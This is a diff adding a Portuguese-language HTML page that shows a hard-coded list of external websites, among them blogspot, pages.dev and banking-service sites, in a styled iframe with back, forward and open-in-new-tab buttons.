@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+ <meta charset="UTF-8">
+  <title>BEM VINDO FIQUE À VONTADE</title>
+  <meta name="description" content="Leitor com iframe elegante e área de notícias dinâmicas.">
+  <meta name="keywords" content="notícias, leitor, iframe, JavaScript, conteúdo dinâmico">
+  <meta name="author" content="Seu Nome ou Site">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 30px;
+      background-color: #0b0b0b; /* Preto profundo */
+      color: #f0f0f0;
+    }
+
+    h1 {
+      color: #ffffff;
+      font-weight: 300;
+      margin-bottom: 30px;
+      border-bottom: 1px solid #333;
+      padding-bottom: 10px;
+    }
+
+    #navegacao {
+      margin-bottom: 20px;
+    }
+
+    button {
+      margin-right: 10px;
+      padding: 10px 20px;
+      background: linear-gradient(to bottom, #222, #000);
+      color: #fff;
+      border: 1px solid #444;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease, transform 0.2s ease;
+      font-size: 16px;
+    }
+
+    button:hover {
+      background: linear-gradient(to bottom, #333, #111);
+      transform: scale(1.05);
+    }
+
+    iframe {
+      width: 100%;
+      max-width: 900px;
+      height: 520px;
+      border: 2px solid #444;
+      border-radius: 8px;
+      background-color: #1a1a1a;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.05);
+    }
+
+    /* Centraliza tudo */
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    #navegacao {
+      display: flex;
+      justify-content: center;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>BEM VINDO FIQUE A VONTADE</h1>
+
+  <div id="navegacao">
+    <button onclick="voltarPagina()">⬅ Voltar</button>
+    <button onclick="avancarPagina()">Avançar ➡</button>
+    <button onclick="abrirNovaAba()">🔗 Abrir em outra aba</button>
+  </div>
+
+  <iframe id="leitor" src="" title="Leitor de conteúdo"></iframe>
+
+  <script>
+    const urls = [
+      "https://recomendadodia23.blogspot.com/",
+      "https://galeria01.pages.dev/",
+      "https://modeloanuncio01.pages.dev/",
+      "https://www.larissasaib.com.br/",
+      "https://espiritosanto-es.com.br/servico-bancario/",
+      "https://geocredibnkvitoria.com/",
+      "https://recomendadodia23.blogspot.com/"
+    ];
+
+    let indiceAtual = 0;
+    const iframe = document.getElementById("leitor");
+
+    function carregarPagina() {
+      iframe.src = urls[indiceAtual];
+    }
+
+    function avancarPagina() {
+      if (indiceAtual < urls.length - 1) {
+        indiceAtual++;
+        carregarPagina();
+      }
+    }
+
+    function voltarPagina() {
+      if (indiceAtual > 0) {
+        indiceAtual--;
+        carregarPagina();
+      }
+    }
+
+    function abrirNovaAba() {
+      window.open(urls[indiceAtual], "_blank");
+    }
+
+    // Inicializa
+    carregarPagina();
+  </script>
+
+</body>
+</html>
